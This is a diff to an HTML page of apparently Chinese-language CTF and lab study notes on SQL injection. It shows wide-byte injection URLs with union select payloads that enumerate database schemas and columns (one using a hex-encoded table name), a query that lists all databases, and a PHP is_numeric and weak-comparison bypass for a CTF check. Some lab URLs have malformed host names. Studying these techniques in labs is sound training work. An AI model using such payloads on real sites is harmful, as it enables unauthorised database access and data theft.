@@ -86,6 +86,21 @@
 <p>如果继续查的话为了替代单引号之类的可以用以下方法<br>1、替代法<br>        user表<br>    <a target="_blank" rel="noopener" href="http://i127.0.0.1t2.lab.aqlab.cn:81/Pass-15/index.php?id=1.1%EF%BF%BD%27">http://i127.0.0.1t2.lab.aqlab.cn:81/Pass-15/index.php?id=1.1%9c%27</a> union select 1,2,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;<code> </code>(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) – qwe&#96;<br>    2、16进制法：（标识）<br>        mysql他支持16输入 替代字符串<br>        <a target="_blank" rel="noopener" href="http://in127.0.0.1t2.lab.aqlab.cn:81/Pass-15/index.php?id=1.1%EF%BF%BD%27">http://in127.0.0.1t2.lab.aqlab.cn:81/Pass-15/index.php?id=1.1%9c%27</a> union select 1,2,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;0x75736572 limit 3,1 – qwe</p>
 <pre><code>有的时候SQLmap需要手动帮助闭合
 </code></pre>
+<p>查询所有库</p>
+<p>select group_concat(schema_name) from information_schema.schemata</p>
+<p>还有一个ctf中的弱等于   很bt    是&#x3D;&#x3D;弱等于先把类型转换成一样的    &#x3D;&#x3D;&#x3D;是强等于类型不一样就false<br>is_number函数的绕过和弱等于相似，拿一个ctf的例子来说：</p>
+<pre><code>          if(is_numeric($b))&#123;
+exit();
+ &#125;
+ if($b&gt;1234)&#123;
+   echo $flag2;
+ &#125;
+</code></pre>
+<p>   不难看出我们想要获取flag，我们需要输入参数b，b既要绕开is_number()还要大于1234。这个时候我们可以这样绕过：</p>
+<pre><code> 给b赋值 ： 1235admin、10000admin、3423v....
+
+ 原理和弱等于的类型转换一样
+</code></pre>
 
                 
                 <p class="end">__END__</p>
